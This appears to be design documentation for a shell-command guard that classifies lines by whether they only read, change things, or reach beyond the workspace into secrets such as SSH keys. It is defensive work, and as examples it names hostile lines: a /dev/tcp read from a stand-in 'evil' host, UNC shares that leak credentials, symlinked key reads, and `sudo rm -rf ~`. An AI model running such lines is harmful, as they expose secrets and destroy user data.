  `Sensitivity::Secret` (a key or a credential: `~/.ssh`, `~/.aws`, `~/.netrc`
  and the rest of core's list), even inside the workspace. That is the case of
  a workspace that is the home folder, or one that holds a folder of logins.
- A line that is `Changes` or `Unknown` has no `Reach`. A path known only when
  it runs is already `Unknown`, so it never gets one.

**What a line reads** is the places the answer already judges, each placed by
core the way a path is for `classify` (so `..`, `.`, doubled separators, `~`,
`$HOME`, case, 8.3 names and UNC paths come out as they do there):

- every file operand of a reader and the source of every `<` redirect;
- the folder of every lister (`ls ~`, `find /`, `Get-ChildItem C:\`);
- the value of an option that names a file, such as `grep -f ~/words`;
- the folder a `cd`, `pushd` or `Set-Location` goes into: going in is a read, so
  `cd ~` is `Beyond` even as a line of its own, for a caller that keeps the
  shell between lines;
- **the working directory, when a reader with no file operand reads it
  without being told.** `ls`, `du`, `fd`, `find` with no start, `rg PATTERN`,
  `grep -r PATTERN`, `Get-ChildItem` and `dir` with no path read the folder the
  line runs in: the caller's `cwd`, moved by every `cd` the guard follows, the
  way `classify` follows it. `git` reads the repository at the working
  directory, or at the folder `-C` names (chained: `-C a -C b` is `a/b`, and an
  absolute one starts over). A line run from outside the workspace, or after
  `cd ~` or a `cd ..` past the workspace's root, is `Beyond`;
- the shell's own expansion of a wildcard in an operand of a program that
  opens nothing (`echo ~/.ssh/*` lists a folder);
- for `find`, the file `-newer`, `-anewer`, `-cnewer` and `-samefile` name;
- for `git`, the revisions and pathspecs after the subcommand, read as paths.
  Some are relative to the repository's root, not to the working directory:
  `:/x`, `:(top)x` and every magic pathspec, `:x` and `:0:x` (the index), and
  `REV:x` unless `x` starts `./` or `../`. The guard does not know where the
  root is, so such a path is judged from the working directory and from each
  workspace folder, and a `Beyond` reading wins.

Lines that read nothing (`echo hi`, `pwd`, `true`, `which cargo`, `basename x`,
`printf`) are `Workspace` from anywhere. So are readers of their input (`cat`,
`head`, `tail`, `wc`, `sort`, `grep PATTERN` with no file) given no operand.

**Deep reads.** A reader that goes below the folders it names reaches what is
below them, so a deep read of a folder that holds a secret is `Beyond`: `rg
PATTERN`, `grep -r`, `diff -r`, `ls -R`, `du`, `find`, `fd`, `git`, PowerShell
`Get-ChildItem -Recurse` (and `-Depth`), cmd `dir /s` and `findstr /s`. It is a
whitelist: a reader is shallow only when its table entry says so for the flags
it is given (`cat`, `head`, `tail`, `wc`, `stat`, `realpath`, `sort`, `file`,
`less`, `df`; `ls`, `diff` and `grep` without a recursive flag; in PowerShell
`Get-Content`, `Select-String`, `Get-Item`, `Test-Path`, `Resolve-Path` and
`Get-ChildItem` without `-Recurse`; in cmd `type`, and `dir` and `findstr`
without `/s`). Anything recursive or unknown is deep, a reader added later
included. A flag counts by any prefix of its long name, as GNU programs and
PowerShell read it (`diff --rec`, `ls --recurs`, `gci -Rec`), and an argument
known only when it runs could be one. A deep read of a folder that holds no
secret, which is nearly every project folder, stays `Workspace`.

A *listing of names* (`ls -R`, `find .`, `git ls-files`, `fd`, `du -a`) is
deep too: it shows where a secret is, so a listing that reaches one is
`Beyond`, and one that only reaches protected paths, `.git` or a startup file
is `Workspace`.

**Wildcards.** A wildcard is judged by what it can pick, with the shell's own
rules for hidden names: a POSIX `*` does not match a leading dot (unless
`dotglob`, `globdots` or `GLOBIGNORE` is on) and `.*` does; PowerShell and cmd
wildcards always do, so `Get-Content *\*` and `Select-String -Path *\*` reach a
hidden folder. A pattern that picks a secret, or goes below one, is `Beyond`; a
deep read of a pattern that picks a folder holding one is too. In PowerShell
and cmd a wildcard with a recursion is a filter on every folder below the one
it starts in. A part that starts with a dot and matches `..` (`.*`, `.?`)
reads the folder above as well, in the shells whose patterns match it.

What a line reads is also judged by what a place is *to the workspace*, which
core's place does not say: a protected path or a startup file is the
workspace's own only when it is inside a workspace folder (`~/.bashrc` is
`Beyond` from a workspace elsewhere, and `Workspace` when the home folder is
the workspace; `~/.agent/x` is `Beyond` when the protected folder is in the
home), judged by the spelling alone, as the paths are.

Whitelist, not blacklist: only the readers known to read just their operands or
their input are left out of the working-directory rule (`cat`, `head`, `tail`,
`wc`, `stat`, `realpath`, `diff`, `sort`, `file`, `less`, `df`; in PowerShell
`Get-Content`, `Select-String`, `Get-Item`, `Test-Path`, `Resolve-Path`; in cmd
`type`, `findstr`). Any other reader, and any reader added to the table later,
is taken to read the working directory when it has no operand, and a reader
whose implicit input cannot be placed is `Beyond`: `df` with no operand reports
every mounted disk.

What stays open, and a caller should know:

- `grep -R`, `rg -L` and `--follow`, and `find -L` and `-follow` follow
  symbolic links by design, so a link in the workspace to a folder of keys is
  read through. Links are placed by their spelling, as everywhere in the guard.
- `git diff`, `git log -p` and `git blame` read the content of every tracked
  file, and a secret that is committed is among them (`git show HEAD:.ssh/x` and
  a pathspec that names it are read as paths and are `Beyond`; the bare `git
  diff` is not). The repository git finds above the working directory is read
  too, and the guard cannot see where it is: a workspace that is not itself a
  repository, inside one that is, reads beyond it.
- `test`, `[` and `[[ ... ]]` check that a file exists and read nothing.
- A POSIX `*` over the home folder (`cat */x` run in it) is `Beyond` because the
  folder is the home folder, whatever the pattern picks; a pattern that picks
  the folder of a login (`cat *` in a folder holding `gh`) is `Beyond` too, as
  `cat` would open it.

### The paths a line reads

`Reach` is judged by spelling, because the guard never touches the disk. So a
link inside the workspace that points out of it reads as `Workspace`: with
`link -> ~/.ssh`, the line `cat link/id_rsa` is `ReadsOnly(Reach::Workspace)`.
A caller that can look at the disk, and runs `Workspace` reads without asking,
needs the places the line reads to check them itself, and how the program
reaches from each: `cat *.rs` opens whatever the shell expands the pattern to
(`a.rs -> ~/.ssh/id_rsa`), `cat src/*/x.rs` is expanded across `src/a -> ~`,
and `grep -R x src` or `ls src | xargs cat` opens what it finds through links.
The guard has already placed each read, so `effect_paths` returns them, from
the same reading as `effect` (one pass, not a second walk):

```rust
effect_paths(line, shell, &paths) -> Option<Vec<ReadPath>>   // Some only for ReadsOnly(_)

pub struct ReadPath { pub path: PathBuf, pub how: How }
pub enum How {
    Exact,                              // one path
    Glob(String),                       // a pattern: `path` is its folder, this the rest
    Tree { follows_links: bool },       // a folder the program walks, or lists for another
}
```

Both enums are exhaustive, like `Effect`: a way of reading the caller does not
handle would be a way past its check.

It is `Some` exactly when `effect` is `ReadsOnly(_)`, the reach either way, and
`None` for `Changes` and `Unknown`. A test holds every row of every table to
that, and holds the paths of every `ReadsOnly(Workspace)` row to be inside a
workspace folder or a temporary folder by spelling.

**How each is read, and what a caller does with it:**

| `how` | Which reads | What the caller checks on disk |
| --- | --- | --- |
| `Exact` | A file operand, a `<` source, a folder a lister lists, a `cd` target, a path `git` takes. | Canonicalize the path: when it does not exist, canonicalize its nearest existing ancestor and put the rest of the names back. |
| `Glob(rest)` | A pattern the shell expands: `path` is the fixed folder it expands in and `rest` what follows it, as written (`src/*/x.rs` is `src` and `*/x.rs`; `*.rs` is the working directory and `*.rs`; `.a*/x` is the working directory and `.a*/x`, the leading dot kept; `C:\*` is `C:\` and `*`). A `for` over a pattern is the same, and so is a pathspec `git` expands. | Expand `path` + separator + `rest` on disk the way the shell does (a wildcard may match a leading dot: match it, to be safe), and canonicalize the folder and every match. The expansion crosses links, so a link shows in a match. |
| `Tree { follows_links: false }` | A folder walked by one of the readers known to stay out of links, given only flags its own list says do not change that: `grep -r` (not `-R`, `-S`), `rg` and `fd` (not `-L`, `--follow`), `find` (not `-L`, `-follow`, `-xtype`, `-exec`, `-ok`), `ls -R` and `du` (not `-L`, `-H`, `--dereference`), and the repository `git` reads (not `--no-index`). `find -H` and `grep -O` follow only the folder named on the command line, which is the root: they stay here. | Canonicalize the root. That is the whole check: such a reader does not cross a link it meets below it. |
| `Tree { follows_links: true }` | A folder walked by a reader that opens what it finds through links: `grep -R` and `grep -rS`, `rg -L` and `--follow`, `fd -L`, `find -L`, `-follow` and `-exec`, `ls -RL`, `du -L`, `diff -r`, and any reader the guard does not know to stay out of links (every PowerShell and cmd walk included). It fails closed: a walker on the list that is given any flag its list does not name, an abbreviation of a flag included (`ls -R --recurs`), follows. Also the folder of a lister whose names a later stage opens: `ls src \| xargs cat`, `git ls-files \| xargs cat`, `find src -print0 \| xargs -0 grep x`, `Get-ChildItem \| Get-Content`. | A link anywhere below the root can lead out, which only walking the folder shows. A caller may simply treat the line as reading beyond the workspace, or walk the folder and canonicalize every entry. |

Where the same place is read in more than one way, the entry that asks the
most is kept: a walk that follows links over a walk that does not, either over
an exact path. A pattern whose matches are walked through links, or whose
listing is handed on, is the walk from its folder.

A caller treats the line as reading beyond the workspace when anything these
checks find leaves it. It compares with the workspace folders after
canonicalizing them too, and with the temporary folders the guard allows,
canonicalized the same way: `/tmp`, `/var/tmp` and `/var/folders`, and on a
Mac `/private/tmp`, `/private/var/tmp` and `/private/var/folders` (`/tmp`
canonicalizes to `/private/tmp`, and `/var/folders` to `/private/var/folders`);
on Windows `%USERPROFILE%\AppData\Local\Temp` and `C:\Windows\Temp`. A temporary
path is `Workspace` by the rule for temporary files, not because it is inside
the workspace, and `effect_paths` lists it like any other.

- **What it holds** is what [What a line reads](#reach) lists: every operand
  and `<` source, a lister's folder, a `cd` target, the working directory
  when a reader reads it without being told, the root of a deep read (`rg TODO
  src` is `src`), the repository at the working directory or the folder `-C`
  chains, and a `git` revision or pathspec as `effect` places it (`git show
  HEAD:a.rs` also lists `a.rs`, from the working directory and from every
  workspace folder).
- **Absolute, by spelling.** Each path is resolved as the guard resolves it:
  the working directory after the `cd`s it follows, `~`, `.` and `..`, a Windows
  long path as the plain path it names. The case, the macOS names of the root
  volume (`/System/Volumes/Data`) and the links are left alone: the path is as
  written, made absolute. It comes from core's `Resolver::absolute`. A `\\?\`
  and a `FileSystem::` in front of a path are not part of a pattern.
- **Sorted, each entry once**, so the answer is the same every time.
- **No path, not listed.** A read that is not a place on a disk has no path:
  the null device and other devices, a registry hive or another PowerShell
  drive, and a path on another drive's own working directory (`D:x` from `C:`).
  Each is judged by its place already (the null device is `Workspace`, the rest
  `Beyond`). `cat /dev/null` is `Some([])`, as `echo hi` is.
- **`Beyond` lines are listed too**, with every read, not only the one that
  made it `Beyond`.
- **Over-listing** is on the safe side: `cat '~/x'` lists the home folder's `x`
  (the guard reads the quoted `~` as home), `cat 0< x` lists a path `0`, and a
  git revision is listed as a path (`HEAD~1`).

`effect` costs what it did: the paths are collected only when `effect_paths`
asks, and `classify` is untouched.

### The readers

The table is short on purpose. A program not in it is `Unknown`. A reader that
takes a flag which writes is `Changes` when the flag is given; one that takes a
flag which runs another program, or can be handed one by an argument known only
when it runs, is `Unknown`.

| Shell | Reads only |
| --- | --- |
| POSIX | `ls`, `cat`, `head`, `tail`, `wc`, `stat`, `pwd`, `echo`, `printf`, `grep`, `egrep`, `fgrep`, `diff`, `du`, `df`, `which`, `realpath`, `basename`, `dirname`, `true`, `false`, `test`, `[`; `less`, `sort`, `file`, `rg`, `fd`, `find` and `git` with the care below; `cd`, `pushd` and `popd` when the guard follows them. |
| PowerShell | `Get-ChildItem`, `Get-Content`, `Select-String`, `Get-Item`, `Get-Location`, `Test-Path`, `Resolve-Path`, `Write-Output`, `Write-Host`, `Where-Object`, `Select-Object`, `Sort-Object`, `Measure-Object` and the aliases `cat`, `gc`, `type`, `sls`, `echo`, `pwd` (and `ls`, `dir`, `gci`, which `classify` already reads as `Get-ChildItem`); `git`; `Set-Location` when followed. |
| cmd | `dir`, `type`, `findstr`, `echo`; `git`; `cd` when followed. |

- GNU `sort`, `file` and `less` take any unambiguous prefix of a long option
  (`sort --outp=x` is `--output=x`, `file --comp` is `--compile`, `less
  --log=x` is `--log-file=x`). So a long option of theirs reads only when it
  is exactly one the guard names (`sort --reverse`, `file --brief`, `less
  --quit-if-one-screen`); a prefix of the option that writes is `Changes`
  (names compare without case, as `less` does), and any other is `Unknown`.
  The other readers have no long option that writes or runs a program, and `git`
  and `rg` refuse abbreviations.
- `sort -o` and `sort --output` write (`Changes`); `--compress-program` runs a
  program. `file -C` writes. `less -o`, `less -O` and `--log-file` write, `less -k`
  reads a lesskey file (whose `#env` section can set `LESSOPEN`), and an
  argument that starts with `+` is a `less` command. `rg --pre`, `rg
  --hostname-bin` and `rg -z` run a program; `fd -x` and `fd -X` run one.
  `printf -v NAME` sets a variable. All the others in the first group have no
  flag that writes or runs anything.
- `find` is `Changes` with `-delete`, `-fprint`, `-fprint0`, `-fprintf` or
  `-fls`. `-exec`, `-execdir`, `-ok` and `-okdir` are not a reason of their own:
  the program they run is a unit, as for `classify`, and is judged as one
  (`find . -exec cat {} +` reads only, `find . -exec rm {} +` changes).
- `git` is read for the subcommands `status`, `log`, `diff`, `show`, `blame`,
  `rev-parse` and `ls-files`, `remote` alone and `remote -v`, and `branch` and
  `tag` when they only list: every flag a listing one, and no operand that
  would create (`git branch topic` makes a branch; `git branch --list 'x*'`
  lists). `--output=FILE` writes. Each of the other reading subcommands has a
  list of the options it knows as reading ones, in `effect/git.rs`, and any
  other option is `Unknown` (`--ext-diff`, `--textconv`, `--help`, and any option
  added later); git refuses abbreviated long options, so a name matches
  exactly. `log`, `show` and `diff` share what they print about a change
  (`--stat`, `--name-only`, `-p`, `-w`, `-M`, `--color`, ...) and `log` and
  `show` what they walk (`--oneline`, `--graph`, `--decorate`, `--all`,
  `--author`, `--since`, `-n`, `-L`, ...); `status` has `-s`, `-b`,
  `--porcelain`, `-u`, `--ignored`; `blame` `-L`, `-w`, `-M`, `-C`, `-e`,
  `--porcelain`; `rev-parse` `--show-toplevel`, `--abbrev-ref`, `--git-dir`,
  `--verify`, `--short`; `ls-files` `-c`, `-d`, `-m`, `-o`, `-s`,
  `--exclude-standard`. Of these, the options that take a file are places: `blame
  --contents`, `--ignore-revs-file` and `-S`, `-O` and `--orderfile` on `diff`,
  `log` and `show`, and `ls-files -X` and `--exclude-from`; a value known only
  when it runs there is `Unknown`. An option that git takes with an optional
  value takes it only after `=` (`--pretty`, `--format`, `--date`, `--color`,
  `--stat`, `-U3`, `-M90%`, `-uno`): alone it takes nothing, so the next word is
  not swallowed. `log --show-signature` is not in the list, since it runs the
  `gpg.program` the repository's config names. `shortlog`, `describe`, `reflog`,
  `cat-file`, `ls-tree`, `grep`, `merge-base` and `rev-list` are not yet read, and
  are `Unknown`. The writing subcommands (`add`, `commit`, `push`, `checkout`, ...) are
  `Changes`, the rest `Unknown`. Only `-C`, `--no-pager`, `-P` and
  `--no-optional-locks` may come before the subcommand: `-c` and the others
  can make git run a command. What the repository's own config makes git run
  is not read, and a caller should know it: `diff.external` and textconv
  drivers (which `diff`, `show`, `log -p` and `blame` run on the files they
  show), `core.fsmonitor` (which `status` runs), and the lazy fetches of a
  partial clone (which any of them may make over the network). Each runs a
  program or touches the network from configuration the guard cannot see.
- Package managers and build tools (`cargo`, `npm`, `pip`, `make`, `brew`,
  `dotnet`, ...) are `Changes` whatever their subcommand.
- A program named with a folder is the program the shell finds by that name
  only in a system folder (`/bin`, `/usr/bin`, `/usr/local/bin`,
  `/opt/homebrew/bin`): `./cat`, `bin/ls` and `/tmp/x/ls` are `Unknown`, as are
  `cat.bat` and, in a POSIX shell, `ls.exe`.
- A variable the line sets or unsets makes it `Unknown`: `PATH=. ls`, `env
  PATH=. ls`, `env -u PATH ls`, `export PATH=...`, `GIT_PAGER=x git log`, and
  in PowerShell and cmd any assignment (`$env:PATH = ...`, `set X=1`). A
  language or a display setting is let through (`LC_ALL=C sort`, `LANG`, `TZ`,
  `TERM`, `COLUMNS`, `LINES`, `NO_COLOR`). A `for` loop's own variable is not a
  setting, unless its name could be one that changes what runs (`PATH`, or in
  zsh `path`).
- A PowerShell method call (`[IO.File]::ReadAllText(...)`, `$x.Delete()`) is
  no unit, and the rules know only some of them: it is `Unknown`. So is a
  backtick substitution in an unquoted here-document, which the grammar does
  not read and the shell runs.
- **A path known only when it runs makes the line `Unknown`.** A reader's file
  operand or the source of a `<` redirect (`cat $f`, `cat < "$F"`, `cat
  "$(pwd)/x"`, `grep x "$f"`, `type %X%`, `Get-Content $x`, `cat ~root/x`) may
  name anything, a network device or a share included, and what cannot be read
  is not reads-only. The paths the guard names stay known: `~`, `$HOME`,
  `$TMPDIR`, `$env:TEMP` and the other forms [Core](core.md) resolves, and a
  glob, which is a pattern over known folders (`cat *.rs` reads only).
- **Only a path is judged as a path.** Each reader's table entry says which
  arguments the program opens as files. A pattern, a count or an author is
  data: `grep -rn "$PATTERN" .`, `rg "$x" src`, `head -n "$N" x`, `sort -k
  "$K" x` and `git log --author="$NAME"` read only. For `grep` and `rg` the
  first operand is the pattern, unless `-e` or `-f` gives it (`-f FILE` and
  `rg --ignore-file FILE` are paths, and so is every operand of `rg --files`);
  a value of an option that takes one is data, unless the option takes a file;
  for `find`, the places are the arguments before the first test, and the
  value of `-name` and the like is data. For `git`, the places are the value
  of `-C`, what comes after `--`, and every operand of `--no-index`; the other
  operands are revisions and pathspecs inside the work tree, which git does
  not take outside it. A value counts as data only when it is known or every
  expansion in it is in double quotes: unquoted, `$x` splits into more
  arguments, options among them, and is an operand. An operand known only when
  it runs is `Unknown` for `git`, since it could be an option. What stays
  open: a quoted pattern or value could itself start with `-` and be read as an
  option.
- **Switches and options that name a file or folder are places too.** In cmd,
  `findstr` takes its switches with `/` or `-` (`/f:file`, `-f:file`) and runs
  letters together after one prefix, the one that takes a value last (`/smf:file`,
  `-if:file`); `/s/b` is two runs. A switch is never an operand. A run with a
  letter `findstr` does not know, or a value switch that is not last, makes the
  line `Unknown`. Three switches name files: `/G:file` holds the search
  strings and `/D:dir;dir` the folders to search (a list split at `;`), and
  their values are places; `/F:file` is a list of files to open, which the
  guard never sees, so it is `Unknown` whatever it names. `/C:string` and
  `/A:attr` are data. With `/G:` or `/C:` every operand is a file, where
  otherwise the first operand is what to search for (one known only when it
  runs could be a switch, so it is a place). `dir`'s `/A:`, `/O:` and `/T:` are
  data, and `type` has no switch. `//server/share` is no switch.
- **An option that reads its list of files to open from another file is
  `Unknown`, whatever its value**, since the list could name a share:
  `findstr /F:`, `wc` and `du` and `sort` `--files0-from`, `file -f` and
  `--files-from`, `find -files0-from`, and `xargs -a` and `--arg-file`. An
  option whose file holds patterns, not paths, is read as a place only:
  `grep -f`, `rg -f`, `findstr /G:`. Of GNU's other long options, `diff
  --from-file` and `--to-file`, `grep` and `rg` `--file`, `du` and `diff`
  `--exclude-from`, `sort --random-source` and `realpath --relative-to` name a
  file, and the file is a place.
- In PowerShell, `-Path` and `-LiteralPath` (`Get-ChildItem`, `Get-Item`,
  `Get-Content`, `Select-String`, `Test-Path`, `Resolve-Path`) and
  `Resolve-Path -RelativeBasePath` are places; `-Filter`, `-Include`,
  `-Exclude`, `-Stream`, `-Encoding`, `-Delimiter`, `-Tail`, `-TotalCount`,
  `-Pattern`, `-PathType` and `-OlderThan` are not. None of the readers in the
  cmd and PowerShell tables has a switch that writes; `sort /O`, `more`,
  `where` and `find` of cmd are not in them and are `Unknown`.
- **An option never swallows an option.** Whenever a reader's option takes
  its value from the next word and that word starts with `-` (a number such as
  `head -n -5` is a value), the line is `Unknown`, in every reader's option
  parser, so an option listed as taking a value that git or another program
  also takes bare can never hide a real option behind it.
- **PowerShell quotes inside a word are taken off as PowerShell takes them**
  before the word is judged: `--contents="\\evil\s"` reaches the program as
  `--contents=\\evil\s`, and a doubled quote inside quotes of its kind is one.
- **A pipeline into a reader** (`xargs cat`, and in PowerShell `Get-Item`,
  `Get-ChildItem`, `Test-Path`, `Resolve-Path`, `Get-Content` and `Select-String`
  with no path of their own) hands it paths, so the stage before it must list
  known places: `ls`, `fd`, `dir`, `Get-ChildItem`, `git ls-files`, or a `find`
  that prints only what it finds (`-printf` and `-exec` print any text), through
  stages that only select or order (`head`, `tail`, `sort`, `grep` with no file
  of its own; `Where-Object`, `Sort-Object` and `Select-Object -First`, with no
  `-Property`). `ls | xargs cat` and `Get-ChildItem | Get-Content` read only;
  `echo a | xargs cat` and `'\\evil\share' | Test-Path` do not. A
  `Select-String` also takes the text of `Get-Content` or another search.
  Programs that only print their operands (`echo`, `printf`, `basename`, `test`,
  `Write-Output`) are not readers of them.
- **A `for` over words written out** (no expansion in the list) is read with
  each word in place of the variable, as if the body were written out, the
  network check included: `for f in *.txt; do wc -l "$f"; done` reads only,
  `for f in /dev/tcp/h/80; do cat $f; done` does not. A glob stands for itself.
  Not read this way, so `Unknown`: a list with an expansion (`for f in $(ls)`),
  no list (`for f; do`), a body that sets the variable (assignment, `unset`,
  `read`, `((`, `${f:=}`, a loop of the same name) or defines a function, a
  variable in the program's own name, and a `<` redirect in the body. More than
  64 combinations of words are not read either.
- A read that contacts the network is `Unknown`, judged on the path's known
  value after quotes are resolved, never on its spelling. Every reader's
  arguments get that check, and so does every value inside one: after the
  `=` of a long option or the `:` of a switch, and attached to a short option
  (`-O//evil/s/x`, `--exclude-from=\\evil\s\x`, `/a:\\evil\s`), so the option
  nobody listed is caught too. Only the spelling of a share or a device is
  checked in a value, not whether it is known: `--author="$NAME"` still reads
  only. In PowerShell a variable inside a bare token (`--contents=$p`) is
  expanded, so such a value is a path known only when it runs. The names are: a path naming bash's
  `/dev/tcp/HOST/PORT` or `/dev/udp/HOST/PORT`, as an operand or as the source
  of a `<` redirect (`cat < /dev/tcp/evil.example/80`; a spelling that hides
  it, such as `/dev/$'\x74'cp/...` or `/dev/${X}tcp/...`, is a path known only
  when it runs); and in PowerShell and cmd a UNC path (`\\server\share`,
  `//server/share`, `\\?\UNC\server\share`, `\\.\UNC\server\share`,
  and `GLOBALROOT` after `\\?\` or `\\.\`, which reaches the share through
  the device namespace), which offers the user's credentials to the server. A
  long path or device that is a disk (`\\?\C:\x`, `\\.\PhysicalDrive0`) is
  not a share. Repeated separators and `.` parts are folded as Windows folds
  them (`\\.\\UNC\host\share`), and a path with `..` in its root counts. Core
  reads that spelling (`spelling::network`), the file guard's `network_share`
  too. A `<` redirect is read in cmd too, with a handle in front (`0<`).
- Not read, so the caller has to account for them: an alias or function
  defined outside the line, the `PATH` the shell runs with, and an option set
  by a start-up file. A name in the table is taken to be the program that
  name means.
- `echo` and `printf` count as reading: with no redirect they change nothing.
  `echo hi > out.txt` is `Changes` through its redirect.

`effect` is an enum of its own and not a field of an explanation of the line.
It is exhaustive, as `Rule` is and for the same reason: the three answers are
the whole question, and a fourth would change what a caller's gate means by
"reads only", so it must break every caller's `match` at compile time. (A
caller that only asks whether `effect(..)` is `ReadsOnly(_)` is unaffected by one.)

## Explaining a line

```rust
explain(line, shell, &paths) -> Explanation
```

When a line comes out wrong, the reason is in the split, which is private.
`explain` returns it: every unit as the rules saw it (the program as written, the
arguments (a known one with its quotes taken off, an unknown or template one as
written), where each argument would land if read as a path, the
folder it runs from after a `cd`, the wrappers taken off, the shell and the
nesting depth it came from, its stage in a pipeline; a part of the line the
grammar reads again, like what follows the `&&` in cmd's `set X=1 && del y`,
counts one level, as the depth limit does) with the findings that
unit produced, each redirect's write the same way, and the findings of the line
itself (a part that cannot be read, a program known only when it runs, a limit
hit). Every known argument that is not an option gets a place, whether or not
the program takes it as a path (`reset` in `git reset` lands inside the
workspace); which arguments are paths is the rules' business, not the tree's.

`classify` is `explain` without the tree: both take their answer from one
reading of the line (`effect` too, from the same split), so `Explanation::findings`
is what `classify` reports, and a test holds them equal for every row of the
tables. `Explanation` implements `Display` as a short indented tree. It builds
the string and prints nothing, so the contract test over `src/` still passes.

The example in the shell crate prints that tree. It is the one place that reads
arguments and prints, and it lives outside `src/`:

```text
cargo run -p milo-guards-shell --example explain -- \
    --shell posix --cwd /work/app --home /home/me --workspace /work/app \
    'sudo rm -rf ~ && bash -c "git reset --hard"'
```

`--shell` is `posix` (the default), `powershell` or `cmd`; `--workspace` can be
repeated. A caller gets `explain` as `milo_local_guards::shell::explain`
through the front door, which has no logic and no example of its own.

## Tests

The tests are tables: `tests/posix.rs` for POSIX lines, `tests/windows.rs` for
PowerShell and cmd, built on core's test kit. Each table has a list of safe
lines and a list of risky lines with the rule each must break. A new rule
comes with rows of both kinds.

`tests/inline.rs` is the same for inline Python and JavaScript, with a table for
what is safe, what each rule finds and what stays `unknown`.

`tests/effect.rs` is the same for `effect`: a table of lines for each answer. Every
line of `posix.rs` and `windows.rs` also goes through `effect`: the shared
`check` does it for each row of a table, and the tests that name a finding's
reason judge their lines with the shared `classify` of `tests/common`, which
does it too. A line `classify` finds risky for anything but an elevation or a
read of a key must not be `ReadsOnly`. The same check runs `explain` over each
row: its findings and assessment must be `classify`'s, and its tree must show
every finding. `tests/issue_15.rs` holds what `explain` shows.

`tests/secrets.rs` holds the rows of `read_secret`: the everyday lines that
stay safe, a line for every program the rule knows, a redirect, a listing
piped into a reader, every spelling of a key in a POSIX shell, on a Mac, in
PowerShell and in cmd, and what the kernel serves; its rows go through the same
`effect` check. The front door's
`crates/guards/tests/agree.rs` holds the shell and the file guard to one
answer (see [Reading a key](#reading-a-key)).

`tests/reach.rs` keeps every probe the review of `Reach` ran, read in a workspace
with nothing protected, one with a protected `.agent`, one that is the home
folder and one that holds a folder of logins, in POSIX, PowerShell and cmd; the
rest of `Reach`'s rows are in `tests/effect.rs`, and core's `reaches_secret`
has its own in `crates/core/tests/reaches_secret.rs`.
`tests/paths.rs` has the rows of `effect_paths`, in POSIX, PowerShell and cmd, and
one that checks every way of reading against a table of links playing the disk,
the way the docs tell a caller to; and
every row of every table is also held to agree with `effect` on whether it has
a list (`common::path_disagreement`). Core's `absolute` has its own in
`crates/core/tests/absolute.rs`.
`tests/names.rs` walks `Rule::ALL` and checks the wire names, that each rule is
listed once, and that the trait gives the same name as the method. Its list of
expected names is a `match` with no fallback arm, so a new rule does not compile
until it is named there. Three files feed the guard random and extreme lines and
check what no line may do to it, for each of the three shells. `tests/robust.rs`
holds six tests (seeded noise that never panics, a line too long or too nested
being unreadable, a line whose nested scripts are read too often being
unreadable, and three that time a nasty line against a 200 ms bound);
`tests/timing.rs` and `tests/limits.rs` hold the rest, as each bullet says:

- **Never panics, and `classify`, `effect` and `explain` agree.** (The wide run
  is `wide_random_lines_never_panic_and_stay_quick` in `tests/timing.rs`;
  `tests/robust.rs` keeps the narrower `random_lines_never_panic`.) Thousands of
  seeded random lines (a small linear congruential generator, so a failure
  names its seed) joined from a wide set of pieces: quotes, substitutions and
  brackets left open, here-documents with no end, here-strings, NUL, a line cut
  through a character or with bytes no text holds read back lossily, and
  PowerShell and cmd metacharacters. The same noise goes through `effect` and
  `explain`, which must agree with `classify`.
- **A line left open is risky, and a delete is never safe.** (In `tests/limits.rs`.) Safe is a verdict
  the guard has to earn, so the tests say what a safe line may be, apart from
  the guard. A line of plain words, separators and one delete (written for the
  shell) is never safe: nothing in it can make the delete inert. A line of
  plain words that ends in a quote, substitution, bracket or here-document left
  open, or an operator with nothing after it, is never safe either, unless its
  shell reads that ending as a plain word: the test keeps a list of those per
  shell (cmd has no single quotes or backticks; PowerShell's grammar reads `<<`
  as a word, though PowerShell itself refuses the line, so nothing runs), and
  a table pins both sides. That a line is read at all is not the
  claim: a program the guard does not know is safe.
- **A line too long or too nested comes back unreadable** (and `Unknown` for
  `effect`). (In `tests/robust.rs`; `tests/limits.rs` measures where the edges
  are.)
- **The time.** (In `tests/timing.rs`, which runs its tests one at a time, and
  in a binary of its own: cargo runs test binaries one after another, so no
  heavy test shares the machine with a clock. The three bounded at 200 ms in
  `tests/robust.rs` stay there.) The worst of the random lines, and a line at the length limit
  in each of fourteen shapes in each shell (a chain, a pipeline and a
  conjunction with each shell's own separator: `;` is no separator in cmd, `&`
  is), classify and give `effect` within a bound that holds in the debug build
  `just verify` runs (500 ms and 2 s). In a release build the longest takes
  under 100 ms, and most are far quicker. Lines that made `find -exec` build
  gigabytes (a place of 25,000 bytes and an argument of 17,000 `{}`), and
  ones of several levels, are timed the same.
- **The limits.** (In `tests/limits.rs`, another binary of its own, for the
  same reason: each search reads many long lines.) The table above, found by measuring and held on both sides:
  the longest line, the deepest bracket nesting for each opener in each shell,
  the most shells in shells, wrappers in front of a program, finds in finds,
  here-documents started on a line, the `find -exec` work (in places, at a
  fixed weight), brackets still open and cmd's `&` and `|` that still read:
  the last two inside a string, where the grammar sees no nesting, so the count
  alone is measured. One past each is unreadable, so a later
  change to a limit, or to how deep a grammar nests, fails loudly. `find`s
  eight places wide and sixteen deep, and five thousand deep, are unreadable
  and return at once.
